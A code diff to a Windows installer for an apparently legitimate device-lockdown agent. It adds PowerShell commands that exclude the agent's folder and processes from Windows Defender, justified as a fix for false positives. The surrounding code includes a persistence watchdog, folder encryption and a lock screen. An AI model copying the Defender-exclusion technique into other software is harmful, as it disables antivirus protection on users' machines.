@@ -85,6 +85,7 @@ DEFAULT_SERVER_URL = ""
 INSTALL_DIR = Path(os.environ.get("PROGRAMDATA", "C:\\ProgramData")) / "LockdownAgent"
 CONFIG_FILE = INSTALL_DIR / "config.json"
 AGENT_EXE_NAME = "lockdown-agent.exe"
+LOCKSCREEN_EXE_NAME = "lockdown-lockscreen.exe"
 INSTALLER_EXE_NAME = "lockdown-installer.exe"
 LOCKDOWN_FOLDER = INSTALL_DIR / "lockdown_folder"
 
@@ -606,6 +607,7 @@ def run_baked_install(config_path: Path, boot_lock_enabled: bool | None = None) 
         update_public_key=pinned,
     )
     installed_agent = install_files(agent_exe)
+    add_defender_exclusions()
     create_lockdown_folder()
     install_service()
     verify_checkin(baked["server_url"], baked["api_key"])
@@ -635,9 +637,65 @@ def install_files(agent_exe: Path) -> Path:
     return dest
 
 
+def add_defender_exclusions() -> bool:
+    """Exclude the install directory and the agent processes from Windows Defender.
+
+    A PyInstaller one-file executable unpacks itself into a fresh temp directory
+    on every start, which Defender's heuristic reads as a dropper; the agent has
+    been quarantined on real hosts because of it. Three exclusion kinds, because
+    they are not interchangeable:
+
+    * ``-ExclusionPath <INSTALL_DIR>`` — the unpacked child processes
+    * ``-ExclusionPath <agent.exe>``  — the binary itself
+    * ``-ExclusionProcess <name>``    — survives the executable being moved
+
+    ``deploy.ps1`` adds path + process; this installer (the CLI/service path, the
+    one used for the FRANKENSTEIN service install) added **neither** until S265,
+    which is why the hardware harness read ``defender_exclusion: null`` in two
+    windows. ``hw_test_harness._mp_exclusions`` now reads both lists for the same
+    reason.
+
+    Failures are non-fatal: an exclusion that cannot be added is a warning, not a
+    reason to abandon an otherwise good install (mirrors deploy.ps1).
+    """
+    print_step(4, "Adding Windows Defender exclusions...")
+    if platform.system() != "Windows":
+        print_warn("Not Windows — skipping Defender exclusions")
+        return False
+
+    commands = [
+        f"Add-MpPreference -ExclusionPath '{INSTALL_DIR}'",
+        f"Add-MpPreference -ExclusionPath '{INSTALL_DIR / AGENT_EXE_NAME}'",
+        f"Add-MpPreference -ExclusionProcess '{AGENT_EXE_NAME}'",
+        f"Add-MpPreference -ExclusionProcess '{LOCKSCREEN_EXE_NAME}'",
+    ]
+    failures = 0
+    for command in commands:
+        try:
+            result = subprocess.run(
+                ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
+                capture_output=True,
+                text=True,
+                timeout=15,
+            )
+            if result.returncode != 0:
+                failures += 1
+        except (OSError, subprocess.SubprocessError):
+            failures += 1
+
+    added = len(commands) - failures
+    if failures:
+        print_warn(f"Defender exclusions: {added}/{len(commands)} added ({failures} failed)")
+    else:
+        print_ok(
+            f"Defender exclusions added: {INSTALL_DIR}, {AGENT_EXE_NAME}, {LOCKSCREEN_EXE_NAME}"
+        )
+    return failures == 0
+
+
 def create_lockdown_folder():
     """Create the lockdown folder with a test file."""
-    print_step(4, f"Creating lockdown folder: {LOCKDOWN_FOLDER}...")
+    print_step(5, f"Creating lockdown folder: {LOCKDOWN_FOLDER}...")
     LOCKDOWN_FOLDER.mkdir(parents=True, exist_ok=True)
 
     # Create a test file so encryption has something to encrypt
@@ -659,7 +717,7 @@ def create_lockdown_folder():
 def install_service():
     """Install the scheduled task watchdog via service_installer."""
 
-    print_step(5, "Installing service (scheduled task + registry watchdog)...")
+    print_step(6, "Installing service (scheduled task + registry watchdog)...")
     try:
         import service_installer
 
@@ -685,7 +743,7 @@ def install_service():
 def verify_checkin(server_url: str, api_key: str) -> bool:
     """Verify the agent can check in to the server."""
 
-    print_step(6, "Verifying agent can reach server...")
+    print_step(7, "Verifying agent can reach server...")
     try:
         # Simple health check
         resp = requests.get(
@@ -999,10 +1057,13 @@ def main():
     # --- Step 3: Install files ---
     installed_agent = install_files(agent_exe)
 
-    # --- Step 4: Create lockdown folder ---
+    # --- Step 4: Defender exclusions (before the service starts the binary) ---
+    add_defender_exclusions()
+
+    # --- Step 5: Create lockdown folder ---
     create_lockdown_folder()
 
-    # --- Step 5: Install service ---
+    # --- Step 6: Install service ---
     install_service()
 
     # --- Step 6: Verify connectivity ---
